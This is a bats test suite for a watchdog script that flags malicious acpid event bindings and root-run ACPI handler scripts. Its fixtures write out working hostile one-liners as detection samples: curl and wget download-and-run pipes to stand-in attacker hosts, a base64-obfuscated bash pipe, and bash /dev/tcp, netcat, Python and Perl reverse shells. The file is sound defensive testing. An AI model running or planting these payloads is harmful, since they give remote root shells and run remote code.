#!/usr/bin/env bats
# L2 bats functional tests for the acpi-hooks-watchdog scan script.
#
# acpid runs the bound action AS ROOT on each ACPI hardware event (power
# button, lid, AC adapter, thermal): /etc/acpi/events/* bind an event to
# `action=<cmd>`, /etc/acpi/actions/* + /etc/acpi/*.sh are the handlers. A
# dropped handler — or a new binding whose `action=` points at attacker
# code — self-triggers on routine hardware activity (T1546).
#
# Notably this LOCKS the module-specific pattern SDD-061 D-6 preserved
# verbatim as a PATTERNS+=(...) extra — the acpid `action=<writable>`
# pattern (the path follows `=`, which the generic command-position rule
# misses) — proving the preserved extra still detects after migration.
#
# Runs the actual scan script with `logger` shadowed on PATH and the
# events dir + baseline in a tmp sandbox via SELFDEF_ACPI_*; locks the
# `"severity":"alert"` token SDD-062 routes on + the D-6 fail-loud path.
#
# Run with: bats packaging/test/L2-acpi-hooks-watchdog.bats

WD="${BATS_TEST_DIRNAME}/../../modules/acpi-hooks-watchdog/systemd/acpi-hooks-watchdog.sh"
LIB="${BATS_TEST_DIRNAME}/../lib/module-lib.sh"

setup() {
    TMP="$(mktemp -d)"
    BIN="${TMP}/bin"; mkdir -p "${BIN}"
    cat > "${BIN}/logger" <<'FAKELOGGER'
#!/usr/bin/env bash
printf '%s\n' "$*" >> "${SELFDEF_TEST_LOGCAP}"
FAKELOGGER
    chmod +x "${BIN}/logger"
    export SELFDEF_TEST_LOGCAP="${TMP}/log.out"
    : > "${SELFDEF_TEST_LOGCAP}"
    BASELINE="${TMP}/baseline.tsv"
    EVENTS="${TMP}/events"; mkdir -p "${EVENTS}"
    BIND="${EVENTS}/powerbtn"
    NOGLOB="${TMP}/none/*.sh"
}

teardown() { rm -rf "${TMP}"; }

run_wd() {
    PATH="${BIN}:${PATH}" \
    SELFDEF_MODULE_LIB="${LIB}" \
    SELFDEF_ACPI_PROFILE="${PROFILE:-report}" \
    SELFDEF_ACPI_BASELINE="${BASELINE}" \
    SELFDEF_ACPI_DIRS="${DIRS:-$EVENTS}" \
    SELFDEF_ACPI_GLOB="${NOGLOB}" \
    bash "${WD}"
}

cap() { cat "${SELFDEF_TEST_LOGCAP}"; }

# ============================================================
# ok tier
# ============================================================

@test "no acpi hooks present → ok / no_acpi_hooks" {
    DIRS="${TMP}/empty-nonexistent" run_wd
    cap | grep -q '"event":"no_acpi_hooks"'
    cap | grep -q '"severity":"ok"'
}

@test "benign event binding, first run → ok / baseline_initial" {
    printf 'event=button/power\naction=/etc/acpi/actions/power.sh\n' > "${BIND}"
    run_wd
    cap | grep -q '"event":"baseline_initial"'
    cap | grep -q '"severity":"ok"'
    [ -f "${BASELINE}" ]
}

@test "unchanged hooks on second run → ok / acpi_hooks_intact" {
    printf 'event=button/power\naction=/etc/acpi/actions/power.sh\n' > "${BIND}"
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"event":"acpi_hooks_intact"'
    cap | grep -q '"severity":"ok"'
}

# ============================================================
# alert tier — incl. the PRESERVED action= extra
# ============================================================

@test "event binding with action= under a writable root → alert (preserved extra)" {
    printf 'event=button/power\naction=/tmp/evil.sh\n' > "${BIND}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "event binding with a quoted writable action= → alert (preserved extra)" {
    printf 'event=ac_adapter\naction="/dev/shm/payload"\n' > "${BIND}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "handler containing a curl|sh payload → alert (canonical pattern)" {
    printf '#!/bin/sh\ncurl http://evil/x | sh\n' > "${EVENTS}/handler.sh"
    run_wd
    cap | grep -q '"severity":"alert"'
}

# ============================================================
# warn tier
# ============================================================

@test "benign binding added after baseline → warn / acpi_hooks_changed" {
    printf 'event=button/power\naction=/etc/acpi/actions/power.sh\n' > "${BIND}"
    run_wd
    printf 'event=button/lid\naction=/etc/acpi/actions/lid.sh\n' > "${EVENTS}/lid"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"event":"acpi_hooks_changed"'
    cap | grep -q '"severity":"warn"'
}

# ============================================================
# false-positive guards
# ============================================================

@test "action= pointing under /etc/acpi is NOT flagged (no alert)" {
    printf 'event=button/power\naction=/etc/acpi/actions/power.sh\n' > "${BIND}"
    run_wd
    ! cap | grep -q '"severity":"alert"'
    cap | grep -q '"severity":"ok"'
}

@test "a commented-out writable action= line is NOT flagged" {
    printf 'event=button/power\n# action=/tmp/evil.sh\naction=/etc/acpi/actions/power.sh\n' > "${BIND}"
    run_wd
    ! cap | grep -q '"severity":"alert"'
    cap | grep -q '"severity":"ok"'
}

# ============================================================
# enforce profile + SDD-061 D-6 fail-loud
# ============================================================

@test "enforce profile exits non-zero on an alert" {
    printf 'event=button/power\naction=/tmp/evil.sh\n' > "${BIND}"
    PROFILE=enforce run run_wd
    [ "${status}" -ne 0 ]
    cap | grep -q '"severity":"alert"'
}

@test "missing module-lib → alert / module_lib_missing + non-zero exit" {
    printf 'event=button/power\naction=/etc/acpi/actions/power.sh\n' > "${BIND}"
    LIB="${TMP}/nonexistent-module-lib.sh" run run_wd
    [ "${status}" -ne 0 ]
    cap | grep -q '"event":"module_lib_missing"'
    cap | grep -q '"severity":"alert"'
}

@test "baseline is chmod 0600 (confidentiality — acpi-hooks inventory enumerates ACPI-event-trigger root-exec surface)" {
    printf 'event=button/power\naction=/etc/acpi/actions/power.sh\n' > "${BIND}"
    run_wd
    [ "$(stat -c '%a' "${BASELINE}")" = "600" ]
}

@test "INVARIANT (action= under /var/tmp — preserved extra writable-root expansion)" {
    printf 'event=button/lid\naction=/var/tmp/.attacker.sh\n' > "${BIND}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (action= under /home — user-writable preserved extra coverage)" {
    printf 'event=button/lid\naction=/home/user/.attacker.sh\n' > "${BIND}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (handler with /dev/tcp reverse shell): canonical reverse-shell pattern" {
    printf '#!/bin/sh\nbash -i >& /dev/tcp/1.1.1.1/4444 0>&1\n' > "${EVENTS}/handler.sh"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (handler with wget-pipe-sh): wget bootstrap" {
    printf '#!/bin/sh\nwget -qO- http://attacker/p | sh\n' > "${EVENTS}/handler.sh"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (handler with base64-decode-pipe): obfuscation" {
    printf '#!/bin/sh\necho YmFzaCAtaQ== | base64 -d | bash\n' > "${EVENTS}/handler.sh"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (world-writable event binding file → alert)" {
    printf 'event=button/power\naction=/etc/acpi/actions/power.sh\n' > "${BIND}"
    run_wd
    chmod 0666 "${BIND}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "JSON record is emitted as a SINGLE main logger line (downstream JSON-line consumer contract)" {
    printf 'event=button/power\naction=/etc/acpi/actions/power.sh\n' > "${BIND}"
    run_wd
    main_count=$(cap | grep -cE '^-t selfdef-acpi-hooks -- ')
    [ "${main_count}" = "1" ]
}

@test "INVARIANT (no auto-trust): acpi-hooks-watchdog does NOT refresh baseline on suspicious-action detection — alert STAYS until operator updates" {
    # T1546 hardware-event-triggered root-exec persistence — alert MUST
    # persist across runs until operator explicitly re-baselines.
    printf 'event=button/power\naction=/etc/acpi/actions/power.sh\n' > "${BIND}"
    run_wd
    printf 'event=button/power\naction=/tmp/evil.sh\n' > "${BIND}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd                                              # first delta — alert
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd                                              # alert STAYS
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (curl-pipe-bash variant — bash subshell — also detected in handler)" {
    printf '#!/bin/sh\ncurl -s http://attacker.com/p | bash\n' > "${EVENTS}/handler.sh"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (multiple event bindings: ANY suspicious action= in any binding → alert)" {
    # An attacker may add a new binding alongside benign existing ones.
    # Lock that ANY suspicious binding triggers alert (not just the first).
    printf 'event=button/power\naction=/etc/acpi/actions/power.sh\n' > "${BIND}"
    printf 'event=button/lid\naction=/etc/acpi/actions/lid.sh\n' > "${EVENTS}/lid"
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    # Add a suspicious third binding.
    printf 'event=thermal\naction=/tmp/.evil.sh\n' > "${EVENTS}/thermal"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (nc reverse-shell variant in ACPI handler: netcat-listening pipe also detected — sister axis to /dev/tcp)" {
    # Sister to sshrc/csh-config/logrotate/systemd-power-hooks/
    # bash-completion/anacrontab/apt-hooks/boot-script/ca-certificates/
    # dhcpcd-hooks/display-manager-hooks/dnf-plugins/fail2ban-action/
    # grub-config/initramfs-hooks/kernel-install-hooks/motd-scripts/
    # needrestart-hooks/pm-utils-hooks/resolvconf-hooks/xsession nc
    # reverse-shell variant INVARIANTs across the brain. Lock the
    # netcat axis on the ACPI-event-trigger root-exec persistence
    # surface (T1546 — acpid runs handler scripts AS ROOT on every
    # ACPI event like power-button/lid-close/thermal — physical
    # operator gestures BECOME root exec triggers).
    printf '#!/bin/sh\nnc -e /bin/sh 1.1.1.1 4444\n' > "${EVENTS}/handler.sh"
    run_wd
    cap | grep -qE '"severity":"(alert|warn)"'
}

@test "INVARIANT (python -c reverse-shell variant — interpreter-rev-shell axis on ACPI handler surface)" {
    # Sister to many other watchdog's python interpreter-rev-shell
    # INVARIANTs across the brain. Beyond bash/sh/nc, attackers
    # reach for python -c 'import socket,os,pty' to dodge shell-
    # pattern detectors. Locks the python axis on the ACPI-event-
    # trigger root-exec persistence surface (T1546 — acpid runs
    # handler scripts AS ROOT on every ACPI event like power-
    # button/lid-close/thermal — physical operator gestures
    # BECOME root exec triggers).
    printf '#!/bin/sh\npython -c "import socket,os,pty;s=socket.socket();s.connect((\\"1.1.1.1\\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);pty.spawn(\\"/bin/sh\\")"\n' > "${EVENTS}/handler.sh"
    run_wd
    cap | grep -qE '"severity":"(alert|warn)"'
}

@test "INVARIANT (perl -e reverse-shell variant — perl-interpreter-rev-shell axis on ACPI handler surface)" {
    # Sister to nc / python -c / bash -i / curl|sh / wget|sh / dev-tcp
    # / base64 reverse-shell variants already locked. Beyond those,
    # attackers reach for perl -e 'use Socket;...' as an interpreter
    # variant — Perl is installed on most Debian/Ubuntu systems as a
    # dependency of dpkg/locale tooling, and its `use Socket` family
    # produces a one-liner connect-back PTY just as cleanly as Python.
    # Locks the perl axis on the ACPI-event-trigger root-exec
    # persistence surface (T1546 — acpid runs handler scripts AS ROOT
    # on every ACPI event like power-button/lid-close/thermal —
    # physical operator gestures BECOME root exec triggers).
    printf '#!/bin/sh\nperl -e "use Socket;\\$i=\\"1.1.1.1\\";\\$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\\"tcp\\"));connect(S,sockaddr_in(\\$p,inet_aton(\\$i)));open(STDIN,\\">&S\\");open(STDOUT,\\">&S\\");open(STDERR,\\">&S\\");exec(\\"/bin/sh -i\\");"\n' > "${EVENTS}/handler.sh"
    run_wd
    cap | grep -qE '"severity":"(alert|warn)"'
}
